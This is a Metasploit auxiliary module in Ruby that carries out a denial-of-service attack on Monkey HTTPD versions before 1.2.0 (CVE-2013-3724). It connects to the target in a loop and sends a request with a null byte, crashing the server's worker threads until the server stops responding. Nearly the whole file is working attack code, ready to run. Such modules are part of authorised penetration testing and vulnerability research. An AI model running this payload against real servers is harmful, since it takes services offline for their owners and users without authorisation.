##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Monkey HTTPD Null Byte Request',
			'Description'    => %q{
				Sending a request containing null bytes causes a
			thread to crash.  If you crash all of the threads,
			the server becomes useless.  Affects versions < 1.2.0.
			},
			'Author'         =>
				[
					'Doug Prostko <dougtko[at]gmail[dot]com>'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-3724'],
				],
			'DisclosureDate' => 'May 25 2013'))

		register_options(
			[
				Opt::RPORT(2001),
				OptInt.new("TIMEOUT", [ false, "Set timeout for connectivity check", 10 ]),
			], self.class)
	end

	def is_alive
		connect
		sock.put("GET / HTTP/1.1\r\nHost:foo\r\n\r\n")
		if ! sock.get_once(-1, datastore['TIMEOUT'])
			raise ::Rex::ConnectionTimeout
		end
		disconnect
	end

	def run
		loop do
			begin
				is_alive
				connect
				print_status("Sending DoS packet to #{rhost}:#{rport}")
				sock.put("\x00 / \r\n\r\n")
				disconnect
				Rex.sleep(1)
			rescue ::Rex::ConnectionRefused
				print_status("Unable to connect to #{rhost}:#{rport}.")
				break
			rescue ::Errno::ECONNRESET
				print_status("DoS packet successful. #{rhost} not responding.")
				break
			rescue ::Rex::HostUnreachable
				print_status("Couldn't connect to #{rhost}:#{rport}.")
				break
			rescue ::Timeout::Error, ::Errno::EPIPE
				print_status("Timeout error connecting to #{rhost}:#{rport}.")
				break
			rescue ::Rex::ConnectionTimeout
				print_good("Monkey server is down!")
				break
			ensure
				disconnect
			end
		end
	end
end
